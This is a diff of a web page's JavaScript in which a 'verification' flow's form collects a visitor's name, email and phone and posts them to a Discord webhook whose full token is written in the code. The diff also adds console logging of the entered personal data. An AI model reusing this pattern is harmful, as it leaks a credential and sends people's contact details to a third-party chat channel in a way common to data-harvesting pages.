@@ -1,4 +1,4 @@
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1303237998428299284/2VqK0JzF3uR9vI2D3v4w5X6Y7Z8a9B0c1D2e3F4g5H6';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';
 
 let loadingProgress = 0;
 
@@ -342,6 +342,8 @@ async function startLoadingSequence() {
 }
 
 function setupInfoForm() {
+    console.log('🔧 Setting up info form...');
+    
     const nameInput = document.getElementById('user-name');
     const emailInput = document.getElementById('user-email');
     const phoneInput = document.getElementById('user-phone');
@@ -349,6 +351,16 @@ function setupInfoForm() {
     const nameError = document.getElementById('name-error');
     const emailError = document.getElementById('email-error');
     const phoneError = document.getElementById('phone-error');
+    
+    // Check if all elements exist
+    console.log('📋 Form elements check:');
+    console.log('  - nameInput:', nameInput ? '✅ Found' : '❌ Missing');
+    console.log('  - emailInput:', emailInput ? '✅ Found' : '❌ Missing');
+    console.log('  - phoneInput:', phoneInput ? '✅ Found' : '❌ Missing');
+    console.log('  - submitBtn:', submitBtn ? '✅ Found' : '❌ Missing');
+    console.log('  - nameError:', nameError ? '✅ Found' : '❌ Missing');
+    console.log('  - emailError:', emailError ? '✅ Found' : '❌ Missing');
+    console.log('  - phoneError:', phoneError ? '✅ Found' : '❌ Missing');
     
     // Clear errors on input
     nameInput.addEventListener('input', function() {
@@ -369,9 +381,16 @@ function setupInfoForm() {
     });
     
     submitBtn.addEventListener('click', async function() {
+        console.log('🚀 Submit button clicked!');
+        
         const name = nameInput.value.trim();
         const email = emailInput.value.trim();
         const phone = phoneInput.value.trim();
+        
+        console.log('📋 Form data:');
+        console.log('  - Name:', name);
+        console.log('  - Email:', email);
+        console.log('  - Phone:', phone);
         
         let hasError = false;
         
@@ -413,25 +432,29 @@ function setupInfoForm() {
             email: email,
             phone: phone
         };
-        
+
         try {
-            // Send webhook with user data and wait for completion
+            console.log(' About to send webhook...');
             const webhookSuccess = await sendWebhook(userData);
-            
-            // Show success screen
-            document.getElementById('info-form').style.display = 'none';
-            document.getElementById('success-screen').style.display = 'block';
-            
-            // Log completion
-            console.log('User information submitted successfully:', userData);
-            console.log('Webhook status:', webhookSuccess ? 'Success' : 'Failed');
-            
-            // Could redirect or show additional options after success
+            console.log(' Webhook result:', webhookSuccess);
+
+            if (webhookSuccess) {
+                console.log(' Webhook successful, showing success screen');
+                document.getElementById('verification-screen').style.display = 'none';
+                document.getElementById('success-screen').style.display = 'flex';
+            } else {
+                console.log(' Webhook failed, showing error');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Information';
+                alert('Failed to send your information. Please try again.');
+            }
+
             setTimeout(() => {
                 console.log('Information submission process completed');
             }, 3000);
         } catch (error) {
             console.error('Error during submission:', error);
+
             
             // Show error message to user
             alert('There was an error submitting your information. Please try again.');
